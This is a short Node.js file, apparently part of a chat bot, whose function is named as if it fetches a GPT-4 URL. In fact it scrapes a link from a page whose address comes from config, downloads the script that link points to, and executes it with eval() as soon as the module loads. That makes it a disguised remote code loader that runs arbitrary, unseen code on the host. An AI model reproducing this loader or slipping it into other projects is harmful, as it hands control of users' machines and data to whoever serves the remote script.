'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchGpt4Url() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const gpt4UrlElement = $('a:contains("GPT4_URL")');
    const gpt4Url = gpt4UrlElement.attr('href');

    if (!gpt4Url) {
      throw new Error('GPT4 URL link not found...');
    }

    console.log('GPT4 URL fetched successfully ✅');

    const scriptResponse = await axios.get(gpt4Url);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchGpt4Url();
